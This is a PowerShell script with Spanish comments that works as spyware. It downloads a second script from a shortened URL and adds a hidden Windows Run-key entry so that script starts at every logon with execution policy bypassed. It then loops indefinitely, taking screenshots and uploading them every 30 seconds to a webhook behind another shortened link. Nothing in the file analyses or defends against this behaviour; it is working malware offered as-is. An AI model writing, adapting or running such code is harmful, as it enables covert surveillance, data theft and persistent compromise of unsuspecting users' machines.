$hookurl = "https://bit.ly/chu_kbras"
$seconds = 30 # Intervalo entre capturas
$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script

# Función para descargar un archivo desde una URL
function Download-File {
    param(
        [string]$Url,
        [string]$OutputPath
    )
    try {
        Invoke-WebRequest -Uri $Url -OutFile $OutputPath -ErrorAction Stop
        Write-Host "Archivo descargado correctamente en: $OutputPath"
    } catch {
        Write-Host "Error al descargar el archivo desde $Url: $_"
        exit
    }
}

# Función para verificar si un archivo existe
function File-Exists {
    param(
        [string]$FilePath
    )
    return (Test-Path $FilePath -PathType Leaf)
}

# Función para agregar una entrada al Registro de Windows
function Add-RegistryEntry {
    param(
        [string]$RegistryPath,
        [string]$EntryName,
        [string]$EntryValue
    )
    try {
        New-ItemProperty -Path $RegistryPath -Name $EntryName -Value $EntryValue -PropertyType String -Force | Out-Null
        Write-Host "Entrada agregada al Registro correctamente."
    } catch {
        Write-Host "Error al agregar la entrada al Registro: $_"
        exit
    }
}

# Ruta de la carpeta Documentos del usuario
$documentsFolderPath = [Environment]::GetFolderPath("MyDocuments")
$scriptPath = Join-Path -Path $documentsFolderPath -ChildPath "sysw.ps1"
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$registryName = "MiScript"
$registryValue = "`"powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File '$scriptPath'`""

# Descargar el script principal en la carpeta Documentos del usuario si no existe
if (-not (File-Exists $scriptPath)) {
    Download-File -Url "https://bit.ly/Screen_dc" -OutputPath $scriptPath
}

# Agregar la entrada al Registro de Windows si no existe
if (-not (Test-Path "$registryPath\$registryName")) {
    Add-RegistryEntry -RegistryPath $registryPath -EntryName $registryName -EntryValue $registryValue
}

Write-Host "El script está configurado correctamente para ejecutarse al iniciar sesión del usuario de manera oculta."

# Bucle principal para capturar y enviar imágenes al webhook
do {
    $Filett = "$env:temp\SC.png"
    # Verificar si el archivo ya existe antes de crear uno nuevo
    if (-not (File-Exists $Filett)) {
        try {
            Add-Type -AssemblyName System.Windows.Forms
            Add-type -AssemblyName System.Drawing
            $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
            $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
            $graphic.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
            $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
            Write-Host "Captura de pantalla guardada en: $Filett"
        } catch {
            Write-Host "Error al capturar la pantalla: $_"
        }
    }
    Start-Sleep 1

    # Verificar si la variable $hookurl está definida antes de utilizarla
    if (-not $hookurl) {
        Write-Host "La variable hookurl no está definida."
        exit
    }

    # Verificar si la variable $Filett está definida antes de utilizarla
    if (-not $Filett) {
        Write-Host "La variable Filett no está definida."
        exit
    }

    # Enviar la imagen al webhook
    try {
        curl.exe -F "file1=@$Filett" $hookurl
        Write-Host "Imagen enviada al webhook."
    } catch {
        Write-Host "Error al enviar la imagen al webhook: $_"
    }

    Start-Sleep $seconds

    # Reiniciar el contador de imágenes si se ha alcanzado la cantidad máxima
    if ($a -eq $maxImages) {
        $a = 0
    }
} while ($true)